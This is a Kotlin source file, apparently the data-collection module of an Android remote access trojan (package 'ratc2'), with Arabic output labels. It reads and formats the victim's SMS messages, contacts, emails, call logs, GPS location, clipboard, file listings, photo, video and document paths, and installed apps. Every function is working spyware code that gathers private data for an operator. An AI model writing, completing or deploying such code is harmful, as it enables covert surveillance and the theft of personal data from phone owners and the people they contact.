package com.spud.ratc2

import android.annotation.SuppressLint
import android.content.Context
import android.location.LocationManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.StatFs
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Telephony
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class Collectors(private val ctx: Context) {

    private val df = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)

    fun deviceInfo(): String = buildString {
        appendLine("=== معلومات الجهاز ===")
        appendLine("الشركة: ${Build.MANUFACTURER}")
        appendLine("الموديل: ${Build.MODEL}")
        appendLine("الاسم: ${Build.DEVICE}")
        appendLine("أندرويد: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})")
        appendLine("المعالج: ${Build.HARDWARE}")
        appendLine("ABI: ${Build.SUPPORTED_ABIS.joinToString()}")
        appendLine("اللغة: ${Locale.getDefault()}")
        appendLine("المنطقة الزمنية: ${java.util.TimeZone.getDefault().id}")
    }

    fun batteryStorage(): String {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val pct = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val mi = android.app.ActivityManager.MemoryInfo()
        am.getMemoryInfo(mi)
        return buildString {
            appendLine("=== البطارية والذاكرة ===")
            appendLine("البطارية: $pct%")
            appendLine("الرام الكلي: ${mi.totalMem / (1024 * 1024)}MB")
            appendLine("الرام الحر: ${mi.availMem / (1024 * 1024)}MB")
        }
    }

    fun storage(): String {
        val d = StatFs(ctx.filesDir.path)
        val total = d.blockCountLong * d.blockSizeLong / (1024L * 1024 * 1024)
        val free = d.availableBlocksLong * d.blockSizeLong / (1024L * 1024 * 1024)
        return "=== التخزين ===\nالكلية: ${total}GB\nالحرة: ${free}GB\nالمستخدمة: ${total - free}GB\n"
    }

    fun network(): String {
        val wifi = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        val ip = wifi.connectionInfo?.ipAddress?.let {
            "${it and 0xff}.${it shr 8 and 0xff}.${it shr 16 and 0xff}.${it shr 24 and 0xff}"
        } ?: "غير متصل"
        return "=== الشبكة ===\nWiFi IP: $ip\nنوع الاتصال: ${wifi.connectionInfo?.ssid ?: "غير معروف"}\n"
    }

    @SuppressLint("MissingPermission")
    fun location(): String {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
        val sb = StringBuilder("=== الموقع الحالي ===\n")
        for (p in listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)) {
            lm.getLastKnownLocation(p)?.let {
                sb.appendLine("المصدر: $p")
                sb.appendLine("خط العرض: ${it.latitude}")
                sb.appendLine("خط الطول: ${it.longitude}")
                sb.appendLine("الدقة: ${it.accuracy} م")
                sb.appendLine("الوقت: ${df.format(Date(it.time))}")
            }
        }
        if (sb.length < 25) sb.append("مافي موقع محفوظ")
        return sb.toString()
    }

    fun locationHistory(): String {
        return "=== آخر 10 مواقع ===\n(يحتاج تسجيل مستمر — ما مفعّل حالياً)\n"
    }

    fun sms(limit: Int, type: String = "all"): String {
        val sb = StringBuilder("=== $limit رسالة SMS ($type) ===\n")
        val sel = when (type) {
            "inbox" -> "${Telephony.Sms.TYPE} = ${Telephony.Sms.MESSAGE_TYPE_INBOX}"
            "sent"  -> "${Telephony.Sms.TYPE} = ${Telephony.Sms.MESSAGE_TYPE_SENT}"
            else -> null
        }
        ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
            sel, null, "${Telephony.Sms.DATE} DESC"
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                val t = if (c.getInt(3) == Telephony.Sms.MESSAGE_TYPE_INBOX) "📩 وارد" else "📤 صادر"
                sb.appendLine("---")
                sb.appendLine("$t | ${c.getString(0)}")
                sb.appendLine("التاريخ: ${df.format(Date(c.getLong(2)))}")
                sb.appendLine("النص: ${c.getString(1)}")
                i++
            }
        }
        return sb.toString()
    }

    fun contacts(limit: Int): String {
        val sb = StringBuilder("=== $limit جهة اتصال ===\n")
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER),
            null, null, null
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                sb.appendLine("👤 ${c.getString(0)} | ${c.getString(1)}")
                i++
            }
        }
        return sb.toString()
    }

    fun emails(): String {
        val sb = StringBuilder("=== الإيميلات ===\n")
        ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
            arrayOf(ContactsContract.CommonDataKinds.Email.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Email.ADDRESS),
            null, null, null
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < 100) {
                sb.appendLine("📧 ${c.getString(0)} | ${c.getString(1)}")
                i++
            }
        }
        return sb.toString()
    }

    fun calls(limit: Int, type: String = "all"): String {
        val sb = StringBuilder("=== $limit مكالمة ($type) ===\n")
        val sel = when (type) {
            "in"   -> "${CallLog.Calls.TYPE} = ${CallLog.Calls.INCOMING_TYPE}"
            "out"  -> "${CallLog.Calls.TYPE} = ${CallLog.Calls.OUTGOING_TYPE}"
            "miss" -> "${CallLog.Calls.TYPE} = ${CallLog.Calls.MISSED_TYPE}"
            else -> null
        }
        ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION, CallLog.Calls.DATE),
            sel, null, "${CallLog.Calls.DATE} DESC"
        )?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                val t = when (c.getInt(1)) {
                    CallLog.Calls.INCOMING_TYPE -> "📥 وارد"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 صادر"
                    CallLog.Calls.MISSED_TYPE   -> "❌ فائت"
                    else -> "?"
                }
                sb.appendLine("$t | ${c.getString(0)} | ${c.getInt(2)}ث | ${df.format(Date(c.getLong(3)))}")
                i++
            }
        }
        return sb.toString()
    }

    fun files(path: String): String {
        val f = File(path)
        if (!f.exists()) return "❌ ما لقيت: $path"
        val sb = StringBuilder("=== $path ===\n")
        f.listFiles()?.sortedBy { it.name }?.take(200)?.forEach {
            val icon = if (it.isDirectory) "📁" else "📄"
            val size = if (it.isFile) " (${it.length()}B)" else ""
            sb.appendLine("$icon ${it.name}$size")
        }
        return sb.toString()
    }

    fun mediaImages(limit: Int): String {
        val sb = StringBuilder("=== آخر $limit صورة ===\n")
        val proj = arrayOf(MediaStore.Images.Media.DATA,
                           MediaStore.Images.Media.DATE_TAKEN,
                           MediaStore.Images.Media.SIZE)
        ctx.contentResolver.query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            proj, null, null, "${MediaStore.Images.Media.DATE_TAKEN} DESC")?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                sb.appendLine("🖼️ ${c.getString(0)}")
                sb.appendLine("   ${c.getLong(2)}B | ${df.format(Date(c.getLong(1)))}")
                i++
            }
        }
        return sb.toString()
    }

    fun mediaVideos(limit: Int): String {
        val sb = StringBuilder("=== آخر $limit فيديو ===\n")
        val proj = arrayOf(MediaStore.Video.Media.DATA,
                           MediaStore.Video.Media.DURATION,
                           MediaStore.Video.Media.SIZE,
                           MediaStore.Video.Media.DATE_TAKEN)
        ctx.contentResolver.query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
            proj, null, null, "${MediaStore.Video.Media.DATE_TAKEN} DESC")?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                sb.appendLine("🎬 ${c.getString(0)}")
                sb.appendLine("   ${c.getInt(1)}ms | ${c.getLong(2)}B | ${df.format(Date(c.getLong(3)))}")
                i++
            }
        }
        return sb.toString()
    }

    fun mediaAudio(limit: Int): String {
        val sb = StringBuilder("=== آخر $limit ملف صوتي ===\n")
        val proj = arrayOf(MediaStore.Audio.Media.DATA,
                           MediaStore.Audio.Media.DURATION,
                           MediaStore.Audio.Media.SIZE)
        ctx.contentResolver.query(MediaStore.Audio.Media.EXTERNAL_CONTENT_URI,
            proj, null, null, "${MediaStore.Audio.Media.DATE_ADDED} DESC")?.use { c ->
            var i = 0
            while (c.moveToNext() && i < limit) {
                sb.appendLine("🎵 ${c.getString(0)}")
                sb.appendLine("   ${c.getInt(1)}ms | ${c.getLong(2)}B")
                i++
            }
        }
        return sb.toString()
    }

    fun documents(limit: Int): String {
        val sb = StringBuilder("=== آخر $limit مستند ===\n")
        val dirs = listOf("/sdcard/Download", "/sdcard/Documents")
        var count = 0
        for (d in dirs) {
            val f = File(d)
            if (!f.exists()) continue
            f.listFiles()?.sortedByDescending { it.lastModified() }?.forEach {
                if (count++ >= limit) return@forEach
                sb.appendLine("📄 ${it.absolutePath} (${it.length()}B)")
            }
        }
        return sb.toString()
    }

    fun apps(): String {
        val sb = StringBuilder("=== كل التطبيقات ===\n")
        ctx.packageManager.getInstalledPackages(0).sortedBy { it.packageName }.forEach {
            sb.appendLine("▪️ ${it.packageName}")
        }
        return sb.toString()
    }

    fun systemApps(): String {
        val sb = StringBuilder("=== تطبيقات النظام ===\n")
        ctx.packageManager.getInstalledPackages(0)
            .filter { (it.applicationInfo.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0 }
            .forEach {
                sb.appendLine("⚙️ ${it.packageName}")
            }
        return sb.toString()
    }

    fun clipboard(): String {
        return try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
            "=== الحافظة ===\n${cm.primaryClip?.getItemAt(0)?.text ?: "(فاضية)"}"
        } catch (e: Exception) { "خطأ: ${e.message}" }
    }

    fun notifications(): String {
        return "=== الإشعارات ===\n(يحتاج NotificationListenerService — غير مفعّل حالياً)\n"
    }
}
